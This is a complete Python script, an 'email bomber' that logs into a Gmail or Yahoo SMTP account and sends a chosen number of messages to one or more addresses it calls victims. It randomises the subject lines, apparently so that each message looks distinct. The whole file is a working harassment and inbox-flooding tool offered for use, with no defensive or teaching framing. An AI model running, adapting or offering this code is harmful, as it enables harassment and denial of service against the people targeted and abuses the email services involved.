import os
import smtplib
import getpass
import sys

class Bomber:
	def __init__(self):
		#get smtp server
		print("Choose a smtp server to continue.")
		print("1. Gmail")
		print("2. Yahoo")
		self.server = int(input("> "))
		self.user = input("Enter your SMTP username: ")
		self.password = getpass.getpass("Enter your password: ")
		self.victim_email = []
		self.message = ""
		self.total_mail = 0

	def get_parameters(self):
		continue_ = True
		while continue_:
			victim_email = input("Enter victim's email: ")
			self.victim_email.append(victim_email)
			if (input('Continue ? (y/n): ') == 'n'):
				continue_ = False
		self.message = input("Enter your message: ")
		self.total_mail = int(input("Number of e-mails to send: "))

	def get_server(self):
		if self.server == 1:
			env = ['smtp.gmail.com', 587]
		elif self.server == 2:
			env = ['smtp.mail.yahoo.com', 25]
		else:
			print("[!] Invalid Selection of SMTP server. ")
			print("[!] Exiting......")
			sys.exit(0)
		return env

	def bombard_mail(self):
		env = self.get_server()
		self.get_parameters()
		try:
			server = smtplib.SMTP(env[0], env[1])
			server.ehlo()
			if env[0] == 'smtp.gmail.com':
				server.starttls()
			try:
				server.login(self.user, self.password)
			except smtplib.SMTPAuthenticationError:
				print("[!] Invalid username or password.")
				print("[!] Try again with correct credentials.")
				print("[!] Exiting.......")
				sys.exit()

			for victim in self.victim_email:
				for i in range(1, self.total_mail):
					subject = str(os.urandom(10))
					message = "Subject: " + subject + "\n" + self.message
					try:
						server.sendmail(self.user, victim, message)
						print ("[*] ", i ,"Email sent successfully to ", victim)
						sys.stdout.flush()
					except:
						print("[!] Failed to send mail to", victim)

			server.quit()
			print("[*] Task Execution Successful.")
		except KeyboardInterrupt:
			print("[!] Task Execution Stopped.")
			print("[!] Exiting......")
			sys.exit()
		

bomber = Bomber()
bomber.bombard_mail()


